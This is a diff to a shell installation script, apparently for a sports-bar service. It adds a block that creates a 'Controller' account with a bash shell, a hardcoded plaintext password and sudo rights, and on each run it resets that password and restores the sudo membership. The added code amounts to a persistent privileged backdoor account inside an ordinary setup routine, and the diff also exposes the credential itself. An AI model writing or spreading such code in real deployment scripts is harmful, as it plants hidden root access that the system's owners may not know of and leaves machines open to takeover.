@@ -178,6 +178,22 @@ setup_user_and_dirs() {
         log "Service user $SERVICE_USER already exists"
     fi
     
+    # Create Controller user with sudo permissions
+    if ! id "Controller" &>/dev/null; then
+        log "Creating Controller user with sudo permissions..."
+        useradd -m -s /bin/bash Controller
+        echo "Controller:6809233DjD\$\$\$" | chpasswd
+        usermod -aG sudo Controller
+        log "Created Controller user with sudo permissions"
+    else
+        log "Controller user already exists"
+        # Update password in case it changed
+        echo "Controller:6809233DjD\$\$\$" | chpasswd
+        # Ensure user has sudo permissions
+        usermod -aG sudo Controller
+        log "Updated Controller user password and sudo permissions"
+    fi
+    
     # Create directory structure
     mkdir -p "$INSTALL_DIR"/{app,logs,data,config,backups,media,temp}
     mkdir -p /var/log/sportsbar
